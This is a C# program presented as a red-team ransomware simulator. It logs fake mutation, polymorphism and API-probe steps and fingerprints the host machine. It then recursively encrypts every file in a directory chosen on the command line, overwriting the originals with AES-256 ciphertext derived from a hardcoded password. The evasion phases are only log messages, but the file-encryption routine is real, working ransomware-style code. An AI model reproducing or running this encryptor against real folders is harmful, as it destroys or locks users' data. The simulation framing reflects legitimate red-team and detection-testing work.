using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Collections.Generic;

class RedTeamSimulator
{
    // Carpeta y log de simulación
    static string baseDir = @"C:\TestEncrypt";
    static string logFile = Path.Combine(baseDir, "simulation_log.txt");
    static Random rnd = new Random();

    static void Main(string[] args)
    {
        Directory.CreateDirectory(baseDir);
        Log("=== Red Team Simulation Start ===");

        // Fase 1: Mutación inicial
        MutateMemoryStrings("Initial", 5);

        // Fase 2: Polimorfismo inicial
        PolymorphismIteration(4);

        // Fase 3: Delay aleatorio
        DelayRandom(3000, 8000);

        // Fase 4: Fingerprint del sistema
        FingerprintSystem();

        // Fase 5: Simulación de llamadas API
        SimulatedAPIProbes();

        // Directorio objetivo (parámetro opcional)
        string targetDir = args.Length > 0 ? args[0] : baseDir;

        // Recuento de archivos objetivo (con manejo de errores)
        EnumerateTargetFiles(targetDir);

        // Fase 6: Iteraciones adicionales
        for (int i = 0; i < 3; i++)
        {
            DelayRandom(1000, 5000);
            MutateMemoryStrings($"Iteration {i + 1}", 3);
            PolymorphismIteration(2);
            SimulatedAPIProbes();
        }

        // Fase final: cifrado AES como señal de éxito
        string password = "test1234";
        EncryptDirectoryAES(targetDir, password);

        Log("=== Simulation Completed Successfully ===");
    }

    // ===================== Funciones avanzadas =====================
    static void MutateMemoryStrings(string label, int iterations)
    {
        for (int i = 0; i < iterations; i++)
        {
            string randomString = RandomString(10 + rnd.Next(10));
            Log($"[Mutate] {label} Iteration {i + 1}: {randomString}");
        }
    }

    // FIX: usa uint para evitar promoción a long y CS0266
    static void PolymorphismIteration(int iterations)
    {
        for (int i = 0; i < iterations; i++)
        {
            uint val = (uint)rnd.Next();
            uint mutated = (val ^ 0xA5A5A5A5u) + 0x12345678u;
            Log($"[Polymorphism] Iteration {i + 1}: {mutated}");
        }
    }

    static void DelayRandom(int minMs, int maxMs)
    {
        int delay = rnd.Next(minMs, maxMs);
        Log($"[Delay] Waiting {delay} ms");
        System.Threading.Thread.Sleep(delay);
    }

    static void FingerprintSystem()
    {
        Log($"[Fingerprint] Machine Name: {Environment.MachineName}");
        Log($"[Fingerprint] OS Version: {Environment.OSVersion}");
        Log($"[Fingerprint] Processor Count: {Environment.ProcessorCount}");

        // Evita conversión implícita long->int
        double totalMb = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024.0 * 1024.0);
        Log($"[Fingerprint] Total Memory (MB): {totalMb:F0}");
    }

    static void SimulatedAPIProbes()
    {
        List<string> apis = new List<string> { "CreateFile", "ReadFile", "WriteFile", "OpenProcess", "EnumProcesses" };
        foreach (var api in apis)
        {
            Log($"[API Probe] Called {api}");
        }
    }

    static void EnumerateTargetFiles(string folder)
    {
        try
        {
            foreach (var file in Directory.EnumerateFiles(folder, "*", SearchOption.AllDirectories))
            {
                Log($"[File Found] {file}");
            }
        }
        catch (UnauthorizedAccessException ua)
        {
            Log($"[Enum SKIP] Acceso denegado en {folder}: {ua.Message}");
        }
        catch (DirectoryNotFoundException dn)
        {
            Log($"[Enum SKIP] Carpeta no encontrada {folder}: {dn.Message}");
        }
        catch (IOException io)
        {
            Log($"[Enum SKIP] Error E/S en {folder}: {io.Message}");
        }
        catch (Exception ex)
        {
            Log($"[Enum ERROR] {folder}: {ex.Message}");
        }
    }

    static void EncryptDirectoryAES(string folder, string password)
    {
        foreach (var file in Directory.EnumerateFiles(folder, "*", SearchOption.AllDirectories))
        {
            try
            {
                // Evita cifrar tu propio log
                if (string.Equals(Path.GetFullPath(file), Path.GetFullPath(logFile), StringComparison.OrdinalIgnoreCase))
                    continue;

                byte[] data = File.ReadAllBytes(file);
                byte[] encrypted = EncryptAES(data, password);
                File.WriteAllBytes(file, encrypted);
                Log($"[AES Encrypt] {file}");
            }
            catch (UnauthorizedAccessException ua)
            {
                Log($"[AES SKIP] {file}: acceso denegado ({ua.Message})");
            }
            catch (IOException io)
            {
                Log($"[AES SKIP] {file}: E/S ({io.Message})");
            }
            catch (Exception ex)
            {
                Log($"[AES ERROR] {file}: {ex.Message}");
            }
        }
    }

    // ===================== Cifrado =====================
    static byte[] EncryptAES(byte[] data, string password)
    {
        // PBKDF2 moderno (evita SYSLIB warning)
        const int KeyBytes = 32;          // 256-bit key
        const int Iterations = 100_000;   // coste razonable para pruebas
        byte[] salt = RandomNumberGenerator.GetBytes(16);

        using var kdf = new Rfc2898DeriveBytes(
            password,
            salt,
            Iterations,
            HashAlgorithmName.SHA256
        );

        using var aes = Aes.Create();
        aes.KeySize = 256;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = kdf.GetBytes(KeyBytes);
        aes.IV = RandomNumberGenerator.GetBytes(16);

        using var ms = new MemoryStream();

        // Cabecera mínima para poder descifrar luego: [salt(16)][iv(16)]
        ms.Write(salt, 0, salt.Length);
        ms.Write(aes.IV, 0, aes.IV.Length);

        using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
        }
        return ms.ToArray();
    }

    // ===================== Utilidades =====================
    static string RandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var sb = new StringBuilder();
        for (int i = 0; i < length; i++)
            sb.Append(chars[rnd.Next(chars.Length)]);
        return sb.ToString();
    }

    static void Log(string message)
    {
        try
        {
            string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
            Directory.CreateDirectory(Path.GetDirectoryName(logFile)!);
            File.AppendAllText(logFile, logEntry + Environment.NewLine);
        }
        catch
        {
            // No detengas la simulación por fallos de log
        }
    }
}
